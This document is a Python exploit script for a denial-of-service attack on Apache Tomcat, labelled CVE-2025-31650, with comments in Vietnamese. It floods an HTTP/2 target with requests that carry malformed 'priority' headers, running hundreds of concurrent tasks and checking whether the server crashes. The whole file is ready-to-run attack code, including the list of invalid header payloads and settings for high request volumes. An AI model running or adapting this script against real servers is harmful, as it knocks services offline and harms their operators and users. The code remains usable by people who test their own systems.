# Exploit Title: Apache Tomcat - Denial of Service (DoS) with Full URL Path Support
# Author: Abdualhadi khalifa (Modified with full URL path fix)
# CVE: CVE-2025-31650

import httpx
import asyncio
import random
import urllib.parse
import sys
import socket
import time
import argparse
from colorama import init, Fore, Style

init()

class TomcatKiller:
    def __init__(self, target_url, send_valid=False):
        self.target_url = target_url
        self.success_count = 0
        self.error_count = 0
        self.start_time = 0.0
        self.send_valid = send_valid
        
        # Các giá trị priority dị dạng (Dùng để tấn công DoS)
        self.invalid_priorities = [
            "u=-1, q=2",
            "u=4294967295, q=-1",
            "u=-2147483648, q=1.5",
            "u=0, q=invalid",
            "u=1/0, q=NaN",
            "u=1, q=2, invalid=param",
            "",
            "u=1, q=1, u=2",
            "u=99999999999999999999, q=0",
            "u=-99999999999999999999, q=0",
            "u=, q=",
            "u=1, q=1, malformed",
            "u=1, q=, invalid",
            "u=-1, q=4294967295",
            "u=invalid, q=1",
        ]
        
        # Các giá trị priority HỢP LỆ theo chuẩn RFC 9218
        self.valid_priorities = [
            "u=3",
            "u=0, i",
            "u=7, i",
            "u=4",
            "u=1",
            None  # Không gửi header priority
        ]

    def parse_url(self):
        try:
            parsed_url = urllib.parse.urlparse(self.target_url)
            if not parsed_url.scheme or not parsed_url.hostname:
                raise ValueError("Invalid URL format.")
            host = parsed_url.hostname
            port = parsed_url.port if parsed_url.port else (443 if parsed_url.scheme == 'https' else 80)
            return host, port
        except Exception:
            print(f"{Fore.RED}Error: Invalid URL. Use http:// or https:// format.{Style.RESET_ALL}")
            sys.exit(1)

    async def check_http2_support(self, host, port):
        async with httpx.AsyncClient(http2=True, verify=False, timeout=5, proxy="http://127.0.0.1:8080", limits=httpx.Limits(max_connections=1000)) as client:
            try:
                # Kiểm tra HTTP/2 bằng đúng URL mục tiêu
                response = await client.get(self.target_url, headers={"user-agent": "TomcatKiller"})
                if response.http_version == "HTTP/2":
                    print(f"{Fore.GREEN}HTTP/2 supported! Proceeding ...{Style.RESET_ALL}")
                    return True
                else:
                    print(f"{Fore.YELLOW}Error: HTTP/2 not supported. This exploit requires HTTP/2.{Style.RESET_ALL}")
                    return False
            except Exception:
                print(f"{Fore.RED}Error: Could not connect to {self.target_url}.{Style.RESET_ALL}")
                return False

    async def send_requests(self, num_requests, task_id):
        async with httpx.AsyncClient(http2=True, verify=False, timeout=0.3, proxy="http://127.0.0.1:8080", limits=httpx.Limits(max_connections=1000)) as client:
            for i in range(num_requests):
                if self.send_valid:
                    chosen_priority = random.choice(self.valid_priorities)
                else:
                    chosen_priority = random.choice(self.invalid_priorities)

                headers = {
                    "user-agent": f"TomcatKiller-{task_id}-{random.randint(1, 1000000)}",
                    "cache-control": "no-cache",
                    "accept": f"*/*; q={random.random()}",
                }
                
                if chosen_priority is not None:
                    headers["priority"] = chosen_priority

                try:
                    # Gửi request chính xác tới self.target_url (bao gồm cả path /demo/hello)
                    await client.get(self.target_url, headers=headers)
                    self.success_count += 1
                except Exception:
                    self.error_count += 1

    async def monitor_server(self, host, port):
        while True:
            try:
                with socket.create_connection((host, port), timeout=2):
                    pass 
            except Exception:
                print(f"\n{Fore.RED}Target {host}:{port} unreachable or crashed!{Style.RESET_ALL}")
                break
            await asyncio.sleep(2)

    async def throughput_monitor(self, total_expected_requests):
        last_total = 0
        while True:
            await asyncio.sleep(1)
            elapsed = time.time() - self.start_time
            current_total = self.success_count + self.error_count
            if elapsed > 0:
                instant_rps = (current_total - last_total)
                avg_rps = current_total / elapsed
                print(f"{Fore.CYAN}[Throughput] Avg: {avg_rps:7.2f} req/s | Instant: {instant_rps:5.2f} req/s | Total: {current_total}/{total_expected_requests} (Succ: {self.success_count}, Err: {self.error_count}){Style.RESET_ALL}", end="\r")
                last_total = current_total
            if current_total >= total_expected_requests:
                break

    async def run_attack(self, num_tasks, requests_per_task):
        host, port = self.parse_url()
        mode_str = "100% Valid Requests" if self.send_valid else "100% Exploit (Invalid Priorities)"
        
        print(f"{Fore.GREEN}Starting test on {self.target_url} | Mode: {mode_str}{Style.RESET_ALL}")
        print(f"Tasks: {num_tasks}, Requests per task: {requests_per_task}")

        total_expected_requests = num_tasks * requests_per_task
        self.start_time = time.time()

        server_monitor_task = asyncio.create_task(self.monitor_server(host, port))
        throughput_task = asyncio.create_task(self.throughput_monitor(total_expected_requests))

        tasks = [self.send_requests(requests_per_task, i) for i in range(num_tasks)]
        await asyncio.gather(*tasks)

        server_monitor_task.cancel()
        throughput_task.cancel()

        total_requests = num_tasks * requests_per_task
        success_rate = (self.success_count / total_requests * 100) if total_requests > 0 else 0
        
        print(f"\n\n{Fore.MAGENTA}===== Test Summary ====={Style.RESET_ALL}")
        print(f"Target: {self.target_url}")
        print(f"Total Requests: {total_requests}")
        print(f"Successful Requests: {self.success_count}")
        print(f"Failed Requests: {self.error_count}")
        print(f"Success Rate: {success_rate:.2f}%")
        print(f"{Fore.MAGENTA}========================={Style.RESET_ALL}")

async def main():
    parser = argparse.ArgumentParser(description="Apache Tomcat CVE-2025-31650 DoS Exploit with Full URL Path Support")
    parser.add_argument("-u", "--url", default="https://192.168.240.1:8443/", help="Target URL (default: https://192.168.240.1:8443/)")
    parser.add_argument("-t", "--tasks", type=int, default=300, help="Number of concurrent tasks (default: 300)")
    parser.add_argument("-r", "--requests", type=int, default=100000, help="Requests per task (default: 100000)")
    parser.add_argument("--valid", action="store_true", help="Send 100%% valid priority requests instead of exploit payload")

    args = parser.parse_args()

    tk = TomcatKiller(target_url=args.url, send_valid=args.valid)
    host, port = tk.parse_url()

    if not await tk.check_http2_support(host, port):
        sys.exit(1)

    await tk.run_attack(args.tasks, args.requests)

if __name__ == "__main__":
    try:
        asyncio.run(main())
        print(f"{Fore.GREEN}Test completed!{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Test interrupted by user.{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}Unexpected error: {e}{Style.RESET_ALL}")
        sys.exit(1)